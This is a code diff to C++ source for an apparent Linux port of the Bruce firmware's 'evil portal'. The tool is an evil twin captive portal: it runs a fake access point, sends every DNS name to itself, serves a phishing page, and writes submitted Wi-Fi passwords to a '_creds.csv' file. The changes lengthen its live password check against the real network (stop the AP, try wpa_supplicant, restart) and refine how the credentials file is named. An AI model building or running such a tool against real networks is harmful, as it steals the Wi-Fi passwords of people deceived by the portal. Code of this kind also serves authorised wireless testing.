@@ -12,8 +12,10 @@
  *   DNSServer.start(53, "*",)  -> dnsmasq address=/#/<gateway> (captive:
  *                                 every name resolves to us, unknown paths
  *                                 serve the portal)
- *   WiFi.begin() verify        -> stop AP, wpa_supplicant attempt (8 x 500ms
- *                                 like verifyCreds), restart AP - one radio
+ *   WiFi.begin() verify        -> stop AP, wpa_supplicant attempt (12 x 500ms
+ *                                 = 6s, like verifyCreds which loops i=1..12;
+ *                                 Bruce evil_portal.cpp:856-860), restart AP -
+ *                                 one radio
  *                                 cannot do AP+STA concurrently here.
  */
 
@@ -326,6 +328,29 @@ std::string parse_ap_tag(const std::string& html) {
     const size_t end = first_line.find("\" -->", name_start);
     if (end == std::string::npos) return "";
     return first_line.substr(name_start, end - name_start);
+}
+
+std::string custom_csv_name(const std::string& path) {
+    // Bruce loadCustomHtml (evil_portal.cpp:500-502): the output CSV is the
+    // lowercased file basename with a trailing ".html" (any case) stripped,
+    // plus "_creds.csv". Lowercase ASCII A-Z only, locale-independently, and
+    // leave every other byte untouched (no std::tolower - its result depends
+    // on the C locale and on char signedness).
+    auto ascii_lower = [](char c) -> char {
+        return (c >= 'A' && c <= 'Z') ? static_cast<char>(c - 'A' + 'a') : c;
+    };
+    std::string base = path;
+    const size_t slash = base.find_last_of('/');
+    if (slash != std::string::npos) base = base.substr(slash + 1);
+    // Strip a trailing ".html" case-insensitively (Bruce drops the last 5
+    // chars of the name), so MyPortal.HTML -> myportal_creds.csv.
+    if (base.size() >= 5) {
+        std::string tail = base.substr(base.size() - 5);
+        for (char& c : tail) c = ascii_lower(c);
+        if (tail == ".html") base.resize(base.size() - 5);
+    }
+    for (char& c : base) c = ascii_lower(c);
+    return base + "_creds.csv";
 }
 
 HttpRequest parse_http_request(const std::string& raw) {
@@ -664,14 +689,15 @@ void start_ap_services(const PortalOptions& opts, const std::string& iface) {
 }
 
 // Linux equivalent of Bruce's verifyCreds(): with one radio we must drop the
-// AP for the ~4s the connect attempt takes, then bring the portal back up.
+// AP for the ~6s (12 x 500ms, Bruce verifyCreds:856-860) the connect attempt
+// takes, then bring the portal back up.
 bool verify_live(const PortalOptions& opts, const std::string& password, const std::string& iface) {
     stop_ap_services();
     write_file(std::string(kWorkDir) + "/wpa.conf", wpa_conf(opts.ap_name, password));
     run("wpa_supplicant -B -i " + iface + " -c " + kWorkDir + "/wpa.conf -P " + kWorkDir +
         "/wpa.pid 2>/dev/null");
     bool connected = false;
-    for (int i = 0; i < 8 && !connected; ++i) { // Bruce: 8 x 500ms, 4s max
+    for (int i = 0; i < 12 && !connected; ++i) { // Bruce: 12 x 500ms, 6s max (verifyCreds:856-860)
         usleep(500000);
         FILE* p = popen(("wpa_cli -i " + iface + " status 2>/dev/null").c_str(), "r");
         if (p) {
@@ -975,13 +1001,9 @@ int evil_portal_main(int argc, char** argv) {
         const std::string ap = parse_ap_tag(html);
         if (!ap.empty()) opts.ap_name = ap; // loadCustomHtml(): the file tag wins
         opts.html_page = html;
-        // Bruce: <basename>.html -> <basename>_creds.csv
-        std::string base = custom_file;
-        const size_t slash = base.find_last_of('/');
-        if (slash != std::string::npos) base = base.substr(slash + 1);
-        const size_t dot = base.rfind(".html");
-        if (dot != std::string::npos && dot + 5 == base.size()) base = base.substr(0, dot);
-        opts.output_file = base + "_creds.csv";
+        // Bruce loadCustomHtml:500-502: <basename>.html -> <basename>_creds.csv
+        // (lowercased). See custom_csv_name().
+        opts.output_file = custom_csv_name(custom_file);
     }
 
     // Make sure hostapd/dnsmasq exist before we touch the radio (apt needs the
